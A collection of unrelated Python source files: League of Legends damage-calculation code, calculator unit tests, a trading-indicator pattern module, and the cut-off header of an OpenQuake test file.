Xerath\n\t'xeratharcanopulsechargeup' : lambda calc, champ, skill: MagicDamage(calc.tooltiptotaldamage(champ, skill)),\n\t'xeratharcanebarrage2'      : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'xerathmagespear'           : lambda calc, champ, skill: MagicDamage(calc.tooltiptotaldamage(champ, skill)),\n\t'xerathlocusofpower2'       : lambda calc, champ, skill: XerathRDamage(calc.tooltiptotaldamage(champ, skill)),\n\t'xerathrmissilewrapper'     : lambda calc, champ, skill: XerathRDamage(calc.tooltiptotaldamage(champ, skill))\n}\n\nDuplicateMap = {\n\t'yasuoq1wrapper': ['yasuoq2wrapper', 'yasuoq3wrapper'],\n\t'xerathlocusofpower2': ['xerathrmissilewrapper'],\n\t'jhinr' : ['jhinrshot']\n}\n\ndef load_spell_calcs(path):\n\tglobal Calculations\n\n\tj = {}\n\twith open(path, 'r') as f:\n\t\tj = json.loads(f.read())\n\n\n\tfor name, vdict in j.items():\n\t\tlname = name.lower()\n\t\tif lname in Calculations:\n\t\t\tcontinue\n\n\t\tobj_dict = {}\n\t\tfor dval_name, dval_values in vdict['data_vals'].items():\n\t\t\tobj_dict[dval_name] = dval_values\n\n\t\tfor formula_name, formula_str in vdict['calcs'].items():\n\t\t\tif '{' not in formula_str and '{' not in formula_name:\n\t\t\t\texec(f'def {formula_name}(self, champ, skill): return {formula_str}')\n\t\t\t\tobj_dict[formula_name] = eval(formula_name)\n\n\t\tobj = type('spell_' + lname, (object, ), obj_dict)()\n\t\tCalculations[lname] = obj\n\t\tdupes = DuplicateMap.get(lname, [])\n\t\tfor name in dupes:\n\t\t\tCalculations[name] = obj\n\nclass OnHitCalculator:\n\tdef calculate(self, source, target) -> (int, int):\n\t\treturn get_items_onhit_damage(source) + PhysDamage(source.base_atk + source.bonus_atk)\n\nclass KalistaOnHitCalculator(OnHitCalculator):\n\tdef calculate(self, source, target) -> (int, int):\n\t\tdmg = super().calculate(source, target)\n\t\tdmg.phys.raw_dmg *= 0.9\n\t\treturn dmg\n\nclass QuinnOnHitCalculator(OnHitCalculator):\n\tdef calculate(self, source, target) -> (int, int):\n\t\tdmg = super().calculate(source, target)\n\n\t\tif target.has_buff('QuinnW'):\n\t\t\tcalcs = Calculations.get('quinnpassive', None)\n\t\t\tdmg.phys.raw_dmg += calcs.bonusdamage(source, None)\n\n\t\treturn dmg\n\nclass OriannaOnHitCalculator(OnHitCalculator):\n\tdef calculate(self, source, target) -> (int, int):\n\t\tdmg = super().calculate(source, target)\n\n\t\torianna_buff = target.get_buff('oriannapstack')\n\n\t\tif orianna_buff:\n\t\t\tbuff_dmg = orianna_buff.count * (14 + 11.2 * int(source.lvl / 3) + source.ap * 0.20)\n\t\telse:\n\t\t\tbuff_dmg = 0\n\n\t\traw_dmg = 10 + 8 * int(source.lvl / 3) + source.ap * 0.15 + buff_dmg\n\n\t\tif dmg.magic:\n\t\t\tdmg.magic.raw_dmg += raw_dmg\n\t\telse:\n\t\t\tdmg.magic = MagicDamage(raw_dmg)\n\n\t\treturn dmg\n\nclass OnHitInfo:\n\n\tdef __init__(self, damage_solver = lambda src, spell: PhysDamage(0.0), only_basics=False):\n\t\tself.damage_solver = damage_solver\n\t\tself.only_basics = only_basics\n\n\tdef get_damage(self, slot, source, spell):\n\t\tif spell:\n\t\t\tif self.only_basics or not spell.static.has_flag(Spell.AppliesOnHit):\n\t\t\t\treturn PhysDamage(0.0)\n\n\t\t\tif not slot.active or slot.active.cd > 0.0:\n\t\t\t\treturn PhysDamage(0.0)\n\n\t\t\treturn self.damage_solver(source, spell)\n\n\t\treturn self.damage_solver(source, None)\n\ndef crit_from_items(item_slots):\n\tcrit = 0.0\n\tfor slot in item_slots:\n\t\tif slot.item:\n\t\t\tcrit += slot.item.crit\n\treturn crit\n\n\ndef onhit_guinsoo(src, spell):\n\treturn PhysDamage(min(200.0, min(crit_from_items(src.item_slots), 1.0) * 100.0 * 2.0))\n\n\ndef onhit_rageknife(src, spell):\n\treturn PhysDamage(min(175.0, min(crit_from_items(src.item_slots), 1.0) * 100.0 * 1.75))\n\n\ndef onhit_noonquiver(src, spell):\n\treturn NoonquiverDamage()\n\n\ndef onhit_recurve_bow(src, spell):\n\treturn PhysDamage(15.0)\n\n\ndef onhit_botrk(src, spell):\n\treturn BotrkDamage()\n\ndef onhit_doran_ring(src, spell):\n\treturn PhysDamage(5.0)\n\n\ndef onhit_nashors(src, spell):\n\treturn MagicDamage(15.0 + 0.2 * src.ap)\n\n\ndef onhit_wits_end(src, spell):\n\treturn MagicDamage(15.0 + 3.82 * (src.lvl - 1))\n\n\ndef onhit_titanic_hydra(src, spell):\n\tdmg = 3.75 if src.is_ranged else 5\n\tdmg += (src.max_health * 0.01125 if src.is_ranged else 0.015)\n\n\treturn PhysDamage(dmg)\n\n\ndef onhit_sheen(src, spell):\n\tif spell or src.has_buff('sheen'):\n\t\treturn PhysDamage(src.base_atk)\n\treturn PhysDamage(0.0)\n\n\ndef onhit_trinity(src, spell):\n\tif spell or src.has_buff('3078trinityforce'):\n\t\treturn PhysDamage(2.0 * src.base_atk)\n\treturn PhysDamage(0.0)\n\n\ndef onhit_kraken(src, spell):\n\tbuff = src.get_buff('6672buff')\n\tif buff and buff.value == 2:\n\t\treturn TrueDamage(60.0 + 0.45 * src.bonus_atk)\n\treturn PhysDamage(0.0)\n\n\ndef onhit_divine_sunderer(src, spell):\n\tif spell or src.has_buff('6632buff'):\n\t\treturn DivineSundererDamage()\n\treturn PhysDamage(0.0)\n\ndef onhit_lichbane(src, spell):\n\tif spell or src.has_buff('lichbane'):\n\t\treturn MagicDamage(1.5 * src.base_atk + 0.4 * src.ap)\n\treturn MagicDamage(0.0)\n\ndef onhit_essence_reaver(src, spell):\n\tif spell or src.has_buff('3508buff'):\n\t\treturn PhysDamage(src.base_atk + 0.4*src.bonus_atk)\n\treturn PhysDamage(0.0)\n\nOnHits = {\n\t3124: OnHitInfo(damage_solver=onhit_guinsoo),\n\t6677: OnHitInfo(damage_solver=onhit_rageknife),\n\t6670: OnHitInfo(damage_solver=onhit_noonquiver, only_basics=True),\n\t1043: OnHitInfo(damage_solver=onhit_recurve_bow),\n\t3153: OnHitInfo(damage_solver=onhit_botrk),\n\t1056: OnHitInfo(damage_solver=onhit_doran_ring, only_basics=True),\n\t3748: OnHitInfo(damage_solver=onhit_titanic_hydra),\n\n\t3115: OnHitInfo(damage_solver=onhit_nashors),\n\t3091: OnHitInfo(damage_solver=onhit_wits_end),\n\t3100: OnHitInfo(damage_solver=onhit_lichbane),\n\t3508: OnHitInfo(damage_solver=onhit_essence_reaver),\n\t6672: OnHitInfo(damage_solver=onhit_kraken),\n\t6632: OnHitInfo(damage_solver=onhit_divine_sunderer),\n\t3057: OnHitInfo(damage_solver=onhit_sheen),\n\t3078: OnHitInfo(damage_solver=onhit_trinity)\n}\n\nDefaultOnHitCalculator = OnHitCalculator()\nChampionOnHitCalculators = {\n\t'kalista' : KalistaOnHitCalculator(),\n\t'quinn'   : QuinnOnHitCalculator(),\n\t'orianna' : OriannaOnHitCalculator()\n}\n\ndef get_items_onhit_damage(source, spell=None) -> MixedDamage:\n\t''' Returns raw on hit damage from items as atuple (physical_damage, magical_damage) '''\n\n\tdmg = MixedDamage()\n\tfor slot in source.item_slots:\n\t\titem = slot.item\n\t\tif not item:\n\t\t\tcontinue\n\n\t\tcalculator = OnHits.get(item.id, None)\n\t\tif not calculator:\n\t\t\tcontinue\n\n\t\tdmg = dmg + calculator.get_damage(slot, source, spell)\n\n\treturn dmg\n\ndef calculate_onhit_dmg(ctx: Context, source: UnitObj, target: UnitObj) -> float:\n\treturn ChampionOnHitCalculators.get(source.name, DefaultOnHitCalculator).calculate(source, target).calc_against(ctx, source, target)\n\ndef calculate_raw_spell_dmg(champ: ChampionObj, spell: SpellObj) -> Damage:\n\tcalculations = Calculations.get(spell.name, None)\n\tif calculations == None:\n\t\treturn Damage(0.0)\n\n\textractor = DamageExtractors.get(spell.name, None)\n\tif extractor == None:\n\t\treturn Damage(0.0)\n\n\tdmg = extractor(calculations, champ, spell)\n\tif spell.static.has_flag(Spell.AppliesOnHit):\n\t\treturn get_items_onhit_damage(champ, spell) + dmg\n\n\treturn dmg\n\n\nload_spell_calcs(os.path.join(os.getenv('APPDATA'), 'Valkyrie\\data\\SpellCalculations.json'))\n", "331": "import pytest\n\nfrom calculator import Calculator\n\n\nclass TestCalculator:\n    def setup(self):\n        self.calc = Calculator()\n    \n    def test_sum(self):\n        assert(self.calc.sum(1,2) == 3)\n    \n    def test_subtraction(self):\n        assert(self.calc.subtraction(10,3) == 7)\n    \n    def test_subtraction_negative_result(self):\n        assert(self.calc.subtraction(2,6) == -4)\n    \n    def test_multiplication(self):\n        assert(self.calc.mult(15,14) == 210)\n        \n    def test_division(self):\n        assert(self.calc.div(100,5) == 20)\n    \n    def test_division_by_zero(self):\n        with pytest.raises(ZeroDivisionError):\n            self.calc.div(10,0)\n    \n    def test_square_root(self):\n        assert(self.calc.sqrt(4) == 2)\n        assert(pytest.approx(self.calc.sqrt(2), 0.01) == 1.41)\n        \n    def test_square_root_of_negative(self):\n        with pytest.raises(ArithmeticError):\n            self.calc.sqrt(-10)\n    \n    def test_exponential(self):\n        assert(self.calc.exp(5,4) == 625)\n    \n    def test_exponential_negative_exponent(self):\n        assert(pytest.approx(self.calc.exp(4,-3), 1e-6) == 0.015625)\n        \n        ", "332": "from src.indicators.StochAstic.StochAstic import StochAstic\nfrom src.utils.Divergence.Divergence import Divergence\nfrom .ParameterReader import ParameterReader\nfrom src.indicators.MACD.MACD import MACD\nfrom src.indicators.RSI.RSI import RSI\nfrom .DatasetIO import DatasetIO\nfrom progress.bar import Bar\nfrom .Config import Config\nimport pandas_ta as ind\nimport pandas as pd\nimport numpy as np\n\n\n#Functions:\n\n#CandlePatterns()\n\n#Run()\n#Get()\n\n#////////////////////\n\n\nclass Patterns():\n\n\tdef __init__(self):\n\n\t\tself.config_candle_pattern_5m = True\n\t\tself.config_candle_pattern_1h = True\n\n\t\t#Run Flags:\n\t\tself.CandlePatternFlag = True\n\t\tself.DailyPatternFlag = True\n\t\tself.DivergencePatternFlag = True\n\t\t#///////////////////////////\n\n\n\t#Candle Patterns:\n\tdef CandlePatterns(self, dataset, symbol):\n\n\t\tcandle_patterns = pd.DataFrame()\n\n\t\tif self.config_candle_pattern_5m == True:\n\n\t\t\tcdl_patterns_5m = ind.cdl_pattern(\n\t\t\t\t\t\t\t\t\t\t\topen_ = dataset['open_5m'],\n\t\t\t\t\t\t\t\t\t\t\thigh = dataset['high_5m'],\n\t\t\t\t\t\t\t\t\t\t\tlow = dataset['low_5m'],\n\t\t\t\t\t\t\t\t\t\t\tclose = dataset['close_5m'],\n\t\t\t\t\t\t\t\t\t\t\tname = 'all'\n\t\t\t\t\t\t\t\t\t\t\t)\n\n\t\t\tbar_config = Config()\n\t\t\tif bar_config.cfg['show_bar']:\n\t\t\t\tbar = Bar(symbol + ' ' + 'Candle Patterns 5M Finding: ', max = int(len(cdl_patterns_5m.columns)))\n\n\t\t\tcounter = 0\n\t\t\tfor pattern in cdl_patterns_5m.columns:\n\n\t\t\t\tcandle_patterns[f'pattern_5m_{counter}'] = cdl_patterns_5m[pattern]\n\n\t\t\t\tcandle_patterns[f'pattern_5m_{counter}'] = candle_patterns[f'pattern_5m_{counter}'].apply(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlambda x: 'buy' if x == 100 else ('sell' if x == -100 else np.nan)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\tif bar_config.cfg['show_bar']:\n\t\t\t\t\tbar.next()\n\n\t\t\t\tcounter += 1\n\n\t\tif self.config_candle_pattern_1h == True:\n\n\t\t\tcdl_patterns_1h = ind.cdl_pattern(\n\t\t\t\t\t\t\t\t\t\t\topen_ = dataset['open_1h'].dropna(),\n\t\t\t\t\t\t\t\t\t\t\thigh = dataset['high_1h'].dropna(),\n\t\t\t\t\t\t\t\t\t\t\tlow = dataset['low_1h'].dropna(),\n\t\t\t\t\t\t\t\t\t\t\tclose = dataset['close_1h'].dropna(),\n\t\t\t\t\t\t\t\t\t\t\tname = 'all'\n\t\t\t\t\t\t\t\t\t\t\t)\n\n\t\t\tif bar_config.cfg['show_bar']:\n\t\t\t\tbar = Bar(symbol + ' ' + 'Candle Patterns 1H Finding: ', max = int(len(cdl_patterns_5m.columns)))\n\n\t\t\tcounter = 0\n\t\t\tfor pattern in cdl_patterns_1h.columns:\n\n\t\t\t\tcandle_patterns[f'pattern_1h_{counter}'] = cdl_patterns_1h[pattern]\n\n\t\t\t\tcandle_patterns[f'pattern_1h_{counter}'] = candle_patterns[f'pattern_1h_{counter}'].apply(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlambda x: 'buy' if x == 100 else ('sell' if x == -100 else np.nan)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\n\t\t\t\tif bar_config.cfg['show_bar']:\n\t\t\t\t\tbar.next()\n\n\t\t\t\tcounter += 1\n\n\t\treturn candle_patterns\n\t#////////////////////////////////////////\n\n\n\t#Daily Pattern:\n\tdef DailyPatterns(self, dataset, symbol):\n\n\t\tDaysOfWeek = ['Monday', 'Tuesday', 'Thursday', 'Wednesday', 'Friday']\n\n\t\tbar_config = Config()\n\t\tif bar_config.cfg['show_bar']:\n\t\t\tbar = Bar(symbol + ' ' + 'Daily Patterns Finding: ', max = int(len(DaysOfWeek)))\n\n\t\tdaily_pattern = pd.DataFrame()\n\n\t\tfor day in DaysOfWeek:\n\n\t\t\tdaily_pattern['pattern_day_' + day] = np.nan\n\t\t\tdaily_pattern['pattern_day_' + day] = dataset['time_5m'].apply(lambda x: 1 if x.day_name() == day else np.nan)\n\n\t\t\tif bar_config.cfg['show_bar']:\n\t\t\t\tbar.next()\n\n\t\treturn daily_pattern\n\t#//////////////////////\n\n\n\t#Divergence Pattern:\n\tdef DivergencePatterns(self, dataset, dataset_5M, dataset_1H, symbol):\n\n\t\tsignalpriority = ['primary', 'secondry', 'primary', 'secondry']\n\t\tsignaltype = ['buy' , 'sell', 'sell' , 'buy']\n\t\ttimeframes = ['5M' , '1H']\n\t\tindicator_names = ['macd', 'stochastic', 'rsi']\n\n\t\tparameter_reader = ParameterReader()\n\n\t\tdivergence_pattern = pd.DataFrame(index = dataset.index)\n\n\t\tbar_config = Config()\n\t\tif bar_config.cfg['show_bar']:\n\t\t\tbar = Bar(\n\t\t\t\t\t\tsymbol + ' ' + 'Daily Patterns Finding: ', \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tmax = int(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlen(signalpriority) * \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlen(signaltype) * \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlen(timeframes) * \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlen(indicator_names)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t)\n\n\t\tfor ind_name in indicator_names:\n\t\t\tfor timfrm in timeframes:\n\t\t\t\tfor sigpriority, sigtype in zip(signalpriority, signaltype):\n\n\t\t\t\t\tif timfrm == '1H' and not dataset_1H: continue\n\t\t\t\t\tif timfrm == '5M' and not dataset_5M: continue\n\n\t\t\t\t\tif timfrm == '1H':\n\t\t\t\t\t\tind_parameters, ind_config, div_parameters, div_config = parameter_reader.Divergence(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsignalpriority = sigpriority,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsignaltype = sigtype,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsymbol = symbol,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttimeframe = timfrm,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset = dataset_1H,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tindicator_name = ind_name\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\telif timfrm == '5M':\n\t\t\t\t\t\tind_parameters, ind_config, div_parameters, div_config = parameter_reader.Divergence(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsignalpriority = sigpriority,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsignaltype = sigtype,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsymbol = symbol,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttimeframe = timfrm,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset = dataset_5M,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tindicator_name = ind_name\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\n\t\t\t\t\t#Add MACD Calculate Params AS Alpha Factor To Dataset:\n\t\t\t\t\tif ind_name == 'macd':\n\n\t\t\t\t\t\tind = MACD(parameters = ind_parameters, config = ind_config)\n\t\t\t\t\t\tind_calc = ind.calculator_macd()\n\n\t\t\t\t\t\tif timfrm == '5M':\n\t\t\t\t\t\t\tind_calc['time'] = dataset_5M[symbol]['time']\n\t\t\t\t\t\t\tind_calc['index'] = ind_calc.index\n\t\t\t\t\t\t\tind_calc.index = ind_calc['time']\n\n\t\t\t\t\t\telif timfrm == '1H':\n\t\t\t\t\t\t\tind_calc['time'] = dataset_1H[symbol]['time']\n\t\t\t\t\t\t\tind_calc['index'] = ind_calc.index\n\t\t\t\t\t\t\tind_calc.index = ind_calc['time']\n\n\t\t\t\t\t\tind_calc.index = ind_calc['index']\n\n\t\t\t\t\t\tcolumn_div = ind_parameters.elements['MACD_column_div']\n\t\t\t\t\t#///////////////////////////////////////\n\n\t\t\t\t\t#Add StochAstic Calculate Params AS Alpha Factor To Dataset:\n\t\t\t\t\telif ind_name == 'stochastic':\n\n\t\t\t\t\t\tind = StochAstic(parameters = ind_parameters, config = ind_config)\n\t\t\t\t\t\tind_calc = ind.calculator_StochAstic()\n\n\t\t\t\t\t\tif timfrm == '5M':\n\t\t\t\t\t\t\tind_calc['time'] = dataset_5M[symbol]['time']\n\t\t\t\t\t\t\tind_calc['index'] = ind_calc.index\n\t\t\t\t\t\t\tind_calc.index = ind_calc['time']\n\n\t\t\t\t\t\telif timfrm == '1H':\n\t\t\t\t\t\t\tind_calc['time'] = dataset_1H[symbol]['time']\n\t\t\t\t\t\t\tind_calc['index'] = ind_calc.index\n\t\t\t\t\t\t\tind_calc.index = ind_calc['time']\n\n\t\t\t\t\t\tind_calc.index = ind_calc['index']\n\n\t\t\t\t\t\tcolumn_div = ind_parameters.elements['StochAstic_column_div']\n\t\t\t\t\t#//////////////////////////////////////////////////////////\n\n\t\t\t\t\t#Add RSI Calculate Params AS Alpha Factor To Dataset:\n\t\t\t\t\telif ind_name == 'rsi':\n\n\t\t\t\t\t\tind = RSI(parameters = ind_parameters, config = ind_config)\n\t\t\t\t\t\tind_calc = ind.calculator_rsi()\n\n\t\t\t\t\t\tif timfrm == '5M':\n\t\t\t\t\t\t\tind_calc['time'] = dataset_5M[symbol]['time']\n\t\t\t\t\t\t\tind_calc['index'] = ind_calc.index\n\t\t\t\t\t\t\tind_calc.index = ind_calc['time']\n\n\t\t\t\t\t\telif timfrm == '1H':\n\t\t\t\t\t\t\tind_calc['time'] = dataset_1H[symbol]['time']\n\t\t\t\t\t\t\tind_calc['index'] = ind_calc.index\n\t\t\t\t\t\t\tind_calc.index = ind_calc['time']\n\n\t\t\t\t\t\tind_calc.index = ind_calc['index']\n\n\t\t\t\t\t\tcolumn_div = 'rsi'\n\t\t\t\t\t#////////////////////////////////////////////////////////////\n\n\n\n\t\t\t\t\tdivergence = Divergence(parameters = div_parameters, config = div_config)\n\n\t\t\t\t\tif timfrm == '1H':\n\t\t\t\t\t\tsignal, _, _ = divergence.divergence(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsigtype = sigtype,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsigpriority = sigpriority,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tindicator = ind_calc,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcolumn_div = column_div,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tind_name = ind_name,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset_5M = dataset_1H,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset_1H = dataset_1H,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsymbol = symbol,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tflaglearn = False,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tflagtest = False\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\n\t\t\t\t\t\tsignal = signal.drop_duplicates(subset = ['time_low_front'])\n\t\t\t\t\t\tsignal.index = signal['time_low_front']\n\n\t\t\t\t\t\tdivergence_pattern['pattern_' + ind_name + '_div_' + '1h_' + sigtype + '_' + sigpriority] = signal['signal']\n\n\n\t\t\t\t\telif timfrm == '5M':\n\t\t\t\t\t\tsignal, _, _ = divergence.divergence(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsigtype = sigtype,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsigpriority = sigpriority,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tindicator = ind_calc,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcolumn_div = column_div,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tind_name = ind_name,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset_5M = dataset_5M,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset_1H = dataset_5M,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsymbol = symbol,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tflaglearn = False,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tflagtest = False\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\n\t\t\t\t\t\tsignal = signal.drop_duplicates(subset = ['time_low_front'])\n\t\t\t\t\t\tsignal.index = signal['time_low_front']\n\n\t\t\t\t\t\tdivergence_pattern['pattern_' + ind_name + '_div_' + '5m_' + sigtype + '_' + sigpriority] = signal['signal']\n\n\t\t\t\t\tif bar_config.cfg['show_bar']:\n\t\t\t\t\t\tbar.next()\n\n\t\treturn divergence_pattern\n\t#/////////////////////\n\n\tdef Run(self, dataset, symbol, dataset_5M, dataset_1H):\n\t\t\n\t\tdatasetio = DatasetIO()\n\n\t\tpattern = pd.DataFrame(index = dataset.index)\n\n\t\tif self.CandlePatternFlag == True:\n\t\t\tcandle_pattern = self.CandlePatterns(dataset = dataset, symbol = symbol)\n\t\t\tpattern = pattern.join(candle_pattern, how = 'right')\n\n\t\tif self.DailyPatternFlag == True:\n\t\t\tdaily_pattern = self.DailyPatterns(dataset = dataset, symbol = symbol)\n\t\t\tpattern = pattern.join(daily_pattern, how = 'right')\n\n\t\tif self.DivergencePatternFlag == True:\n\t\t\tdivergence_pattern = self.DivergencePatterns(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset = dataset, \n\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset_5M = dataset_5M, \n\t\t\t\t\t\t\t\t\t\t\t\t\t\tdataset_1H = dataset_1H, \n\t\t\t\t\t\t\t\t\t\t\t\t\t\tsymbol = symbol\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\tpattern = pattern.join(divergence_pattern, how = 'right')\n\n\t\tdatasetio.Write(name = 'pattern', dataset = pattern, symbol = symbol)\n\n\t\treturn pattern\n\n\n\tdef Get(self, dataset, symbol, mode = None, dataset_5M = {}, dataset_1H = {}):\n\n\t\tdatasetio = DatasetIO()\n\n\t\tpattern = pd.DataFrame(index = dataset.index)\n\t\t\n\t\tif mode == None:\n\t\t\tpattern = datasetio.Read(name = 'pattern', symbol = symbol)\n\n\t\t\tif pattern.empty == False:\n\t\t\t\treturn pattern\n\n\t\t\telse:\n\t\t\t\treturn self.Run(\n\t\t\t\t\t\t\tdataset = dataset, \n\t\t\t\t\t\t\tsymbol = symbol, \n\t\t\t\t\t\t\tdataset_5M = dataset_5M, \n\t\t\t\t\t\t\tdataset_1H = dataset_1H\n\t\t\t\t\t\t\t)\n\n\t\tif mode == 'Run':\n\t\t\tdatasetio.Delete(name = 'pattern', symbol = symbol)\n\n\t\t\treturn self.Run(\n\t\t\t\t\t\t\tdataset = dataset, \n\t\t\t\t\t\t\tsymbol = symbol, \n\t\t\t\t\t\t\tdataset_5M = dataset_5M, \n\t\t\t\t\t\t\tdataset_1H = dataset_1H\n\t\t\t\t\t\t\t)\n\t\t\t\n", "333": "import unittest\nfrom unittest.mock import patch\nimport pytest\n\nfrom app.calc import Calculator\n\n\ndef mocked_validation(*args, **kwargs):\n    return True\n\n\n@pytest.mark.unit\nclass TestCalculate(unittest.TestCase):\n    def setUp(self):\n        self.calc = Calculator()\n\n    def test_add_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.add(2, 2))\n        self.assertEqual(0, self.calc.add(2, -2))\n        self.assertEqual(0, self.calc.add(-2, 2))\n        self.assertEqual(1, self.calc.add(1, 0))\n\n    def test_divide_method_returns_correct_result(self):\n        self.assertEqual(1, self.calc.divide(2, 2))\n        self.assertEqual(1.5, self.calc.divide(3, 2))\n\n    def test_add_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.add, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.add, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.add, \"2\", \"2\")\n        self.assertRaises(TypeError, self.calc.add, None, 2)\n        self.assertRaises(TypeError, self.calc.add, 2, None)\n        self.assertRaises(TypeError, self.calc.add, object(), 2)\n        self.assertRaises(TypeError, self.calc.add, 2, object())\n\n    def test_divide_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.divide, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.divide, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.divide, \"2\", \"2\")\n\n    def test_divide_method_fails_with_division_by_zero(self):\n        self.assertRaises(TypeError, self.calc.divide, 2, 0)\n        self.assertRaises(TypeError, self.calc.divide, 2, -0)\n        self.assertRaises(TypeError, self.calc.divide, 0, 0)\n        self.assertRaises(TypeError, self.calc.divide, \"0\", 0)\n\n    @patch('app.util.validate_permissions', side_effect=mocked_validation, create=True)\n    def test_multiply_method_returns_correct_result(self, _validate_permissions):\n        self.assertEqual(4, self.calc.multiply(2, 2))\n        self.assertEqual(0, self.calc.multiply(1, 0))\n        self.assertEqual(0, self.calc.multiply(-1, 0))\n        self.assertEqual(-2, self.calc.multiply(-1, 2))\n\n    def test_power_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.power, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.power, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.power, \"2\", \"2\")\n\n    def test_power_method_returns_correct_result(self):\n        self.assertEqual(0, self.calc.power(0, 2))\n        self.assertEqual(1, self.calc.power(4, 0))\n        self.assertEqual(64, self.calc.power(8, 2))\n        self.assertEqual(64, self.calc.power(-8, 2))\n        self.assertEqual(-27, self.calc.power(-3, 3))\n        self.assertEqual(0.5, self.calc.power(2, -1))\n\n    def test_sqrt_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.sqrt, \"2\")\n\n    def test_sqrt_method_returns_correct_result(self):\n        self.assertEqual(8, self.calc.sqrt(64))\n\n    def test_log10_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.log10, \"2\")\n\n    def test_log10_method_returns_correct_result(self):\n        self.assertEqual(2, self.calc.log10(100))\n\nif __name__ == \"__main__\":  # pragma: no cover\n    unittest.main()\n", "334": "# -*- coding: utf-8 -*-\n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n# Copyright (C) 2014-2022 GEM Foundation\n#\n# OpenQuake is free software: you can redistribute it and/or modify it\n# under the terms of the GNU Affero General Public License as published\n# by the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# OpenQuake is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Affero General Public License for more details.\n#\n# You should have received a copy of the GNU Affero General Public License\n# along with OpenQuake. If not, see .\n\nimport io\nimport os\nimport re\nimport math\nimport pandas\n\nimport numpy.testing\n\nfrom openquake.baselib.hdf5 import read_csv\nfrom openquake.baselib.general import countby, gettemp\nfrom openquake.hazardlib import InvalidFile\nfrom openquake.commonlib.datastore import read\nfrom openquake.baselib.writers import write_csv\nfrom openquake.commonlib.util import max_rel_diff_index\nfrom openquake.commonlib.calc import gmvs_to_poes\nfrom 